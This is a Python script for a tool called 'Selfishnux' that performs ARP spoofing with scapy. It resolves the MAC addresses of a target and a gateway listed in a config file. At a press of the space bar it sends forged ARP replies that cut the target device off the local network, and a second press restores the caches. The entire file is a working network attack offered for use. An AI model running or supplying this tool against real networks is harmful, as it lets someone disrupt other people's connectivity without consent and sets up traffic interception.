import time
import subprocess
import keyboard
import json
import os
from scapy.all import ARP, Ether, sendp, send, srp
from colorama import Fore, Style

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc

def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    arp_response_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    arp_response_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    sendp(arp_response_target, iface=interface, verbose=False)
    sendp(arp_response_gateway, iface=interface, verbose=False)

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    packets = [
        Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac),
        Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
    ]

    [sendp(x, verbose=0, count=3) for x in packets]

def main():
    clear_screen()

    with open("config.json", "r") as file:
        data = json.loads(file.read())

    config_global = data["global"]
    config = data["infos"]

    version = config["version"]

    target_ip = config_global["target_ip"]
    gateway_ip = config_global["gateway_ip"]
    interface = config_global["interface"]

    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)

    print(Fore.CYAN + f"Selfishnux version {version}\n" + Style.RESET_ALL)
    print(Fore.CYAN + "Target ip  : " + Fore.GREEN + target_ip + Style.RESET_ALL)
    print(Fore.CYAN + "Gateway ip  : " + Fore.GREEN + gateway_ip + Style.RESET_ALL)
    print(Fore.CYAN + "Interface  : " + Fore.GREEN + interface + Style.RESET_ALL)

    print(Fore.WHITE + "\nPress " + Fore.CYAN + "[SPACE]" + Fore.WHITE + " to block/unblock target device\n" + Style.RESET_ALL)

    blocked = False

    while True:
        time.sleep(0.2)
        keyboard.read_key()
        if keyboard.is_pressed("space"):
            if not blocked:
                arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac, interface)
                print(Fore.RED + f"{target_ip} : blocked" + Style.RESET_ALL)
                blocked = True
            else:
                restore(target_ip, target_mac, gateway_ip, gateway_mac)
                print(Fore.GREEN + f"{target_ip} : unblocked" + Style.RESET_ALL)
                blocked = False
main()